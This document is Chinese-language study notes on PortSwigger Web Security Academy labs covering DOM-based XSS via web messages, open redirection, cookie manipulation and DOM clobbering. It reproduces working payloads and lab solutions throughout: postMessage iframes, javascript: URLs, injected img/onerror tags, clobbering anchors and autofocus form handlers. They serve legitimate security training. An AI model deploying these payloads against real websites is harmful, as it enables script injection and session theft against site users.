## 污染流漏洞
### 源

#### 反射和存储数据
关联主题 XSS - DOM XSS 结合反射和存储数据
https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data

#### Web消息源

实验：使用 web 消息的 DOM XSS
https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages

在主页发现脚本
```JavaScript
// 源为 postMessage 发送的跨文档消息
// 汇为 innerHTML
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('ads').innerHTML = e.data;
    })
</script>
// <div id="ads"></div>
```
修改示例代码，保存到控制服务器的页面
```javascript
// <script>print()</script> 无效
// <img src=x onerror=print()> 使用事件监听器
<iframe src="https://0a0700040396e01780f121c2000300b5.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')">
```


实验：使用 web 消息和 JavaScript URL 的 DOM XSS
https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-a-javascript-url

在主页发现脚本
```JavaScript
// 源为 postMessage 发送的跨文档消息
// 汇为 location.href
<script>
    window.addEventListener('message', function(e) {
        var url = e.data;
        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
            location.href = url;
        }
    }, false);
</script>
```
修改示例代码，保存到控制服务器的页面
```javascript
// location.href = 'javascript:http:print()';
// javascript: url形式的JavaScript协议
// http: 在JavaScript中作为代码块标记，并通过有缺陷的验证

<iframe src="https://0a0800440339300c82eb016b00d300c9.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:http:print()','*')">
```

示例代码使用JavaScript注释掉 http:
> ```javascript
> <iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">
> ```


### 源

实验：使用 web 消息和 JSON.parse 进行 DOM XSS
https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages-and-json-parse

在主页发现脚本
```javascript
// 传递信息应使用json格式，
<script>
    window.addEventListener('message', function(e) {
        var iframe = document.createElement('iframe'), 
            ACMEplayer = {element: iframe}, 
            d;
        document.body.appendChild(iframe);
        try {
            d = JSON.parse(e.data);
        } catch(e) {
            return;
        }
        switch(d.type) {
            case "page-load":
                ACMEplayer.element.scrollIntoView();
                break;
            case "load-channel":
                ACMEplayer.element.src = d.url;
                break;
            case "player-height-changed":
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;
        }
    }, false);
</script>
```
修改示例代码，保存到控制服务器的页面
```html
<!-- 基于验证构建json，对象转json -->
<script>
var payloadjson = JSON.stringify({"type":"load-channel","url":"javascript:print()"});
console.log(JSON.parse(payloadjson));
</script>
<iframe src="https://0a0800680423925880fc5d5d00fd0045.web-security-academy.net/" onload="this.contentWindow.postMessage(payloadjson,'*')">
```

示例解决方案：构造JavaScript的json字符串，外层添加双引号，内存转义双引号
> <iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>


### 汇

#### document.write()
关联主题 XSS - DOM型XSS
https://portswigger.net/web-security/cross-site-scripting/dom-based



#### window.location
基于 DOM 的开放重定向

实验：基于 DOM 的开放重定向
https://portswigger.net/web-security/dom-based/open-redirection/lab-dom-open-redirection

在文章页面
```html
<div class="is-linkback">
    <a href='#' onclick='returnUrl = /url=(https?:\/\/.+)/.exec(location); location.href = returnUrl ? returnUrl[1] : "/"'>Back to Blog</a>
</div>
```

设计url为：使用 # 而不是 & 也可跳转到控制页面，但无法通过lab
https://0abd00d8049be16181e24393006c005e.web-security-academy.net/post?postId=6&url=https://exploit-0a1600f304f1e17d811d425701210039.exploit-server.net/exploit



#### document.cookie
基于 DOM 的 cookie 操作

实验：基于 DOM 的 cookie 操作
https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation

在文章页面的脚本将基于当前url设置cookie
```html
<script>
    document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```
回到主页后新增cookie且导航栏新增链接
Cookie: 
session=mw6VNuvWXZNmJKy7E8hDKcAQWxgjBj16; 
lastViewedProduct=https://0a3300d3038c80c08beb2a8600a50062.web-security-academy.net/product?productId=17
```html
<a href='https://0a3300d3038c80c08beb2a8600a50062.web-security-academy.net/product?productId=17'>Last viewed product</a>
```

将此get发送到重复器更改cookie值检查注入
lastViewedProduct='><img src=x onerror=print()>
可注入

对攻击向量进行url编码并构建url
https://0a3300d3038c80c08beb2a8600a50062.web-security-academy.net/product?productId=17&lastViewedProduct='><img+src%3dx+onerror%3dprint()>

设置控制页面
```html
<iframe src="https://0a320021041362a9811870c700b500e2.web-security-academy.net/product?productId=17&lastViewedProduct='><img+src%3dx+onerror%3dprint()>" onload=location.href='https://0a320021041362a9811870c700b500e2.web-security-academy.net/'>
```

示例解决方案：设置cookie后变更iframe地址到xss页面，而不是跳转当前页面到xss页面
> <iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&'><script>print()</script>" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net';window.x=1;">

#### DOM 篡改

实验：利用 DOM 篡改启用 XSS
https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering

GET /post?postId=4 HTTP/2
```html
<span id='user-comments'>
    <script src='/resources/js/domPurify-2.0.15.js'></script>
    <script src='/resources/js/loadCommentsWithDomClobbering.js'></script>
    <script>loadComments('/post/comment')</script>
</span>
```

GET /resources/js/loadCommentsWithDomClobbering.js HTTP/2
```javascript

let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
let avatarImgHTML = '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">';
// <a id=defaultAvatar><a id=defaultAvatar name=avatar href=//test'-alert(1)-'> 
// a 标签的值为 href 属性值
// 双引号与尖括号被转义，当href不使用//开头时img的src被加入当前页面的url前缀
// 由于头像在评论前，于是在第二条评论时才可篡改
    
```

GET /post/comment?postId=4 HTTP/2
```json
[
    {"avatar":"",
    "website":"",
    "date":"2025-10-11T19:09:27.516Z",
    "body":"I keep telling my husband how good your blogs are and how much he's enjoy reading them. Which is really cruel as he's blind.","author":"Lee Mealone"}
]
```

示例解决方案：
> 注意该网站尝试使用 DOMPurify 过滤器来减少基于 DOM 的漏洞。然而，DOMPurify 允许你使用 cid: 协议，该协议不会对双引号进行 URL 编码
> <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">


实验：通过篡改 DOM 属性绕过 HTML 过滤器
https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters
参照
实验：存储型 XSS 攻击到 HTML 上下文中且未进行任何编码
https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded


GET /post?postId=10 HTTP/2
```html
<span id='user-comments'>
    <script src='/resources/js/htmlJanitor.js'></script>
    <script src='/resources/js/loadCommentsWithHtmlJanitor.js'></script>
    <script>loadComments('/post/comment')</script>
</span>
```

GET /resources/js/loadCommentsWithHtmlJanitor.js HTTP/2
```javascript

firstPElement.appendChild(avatarImgElement);
commentSection.appendChild(firstPElement);

if (comment.body) {
    let commentBodyPElement = document.createElement("p");
    commentBodyPElement.innerHTML = janitor.clean(comment.body);
    commentSection.appendChild(commentBodyPElement);
}
commentSection.appendChild(document.createElement("p"));
userComments.appendChild(commentSection);

```


与之前XSS的lab相同，能够print但无法通过lab
<form oncontentvisibilityautostatechange=print() style=display:block;content-visibility:auto><input id=attributes>Click me

使用自动聚焦
<form tabindex=1 onfocusin=print() autofocus><input id=attributes>Click me

<script>
    location.href = 'https://0a6300fa04bfd73080410d6a004b007e.web-security-academy.net/post?postId=2';
</script>

示例解决方案：设置form可聚焦，并设置延时url#聚焦form元素，触发聚焦事件
> <form id=x tabindex=0 onfocus=print()><input id=attributes>
> <iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
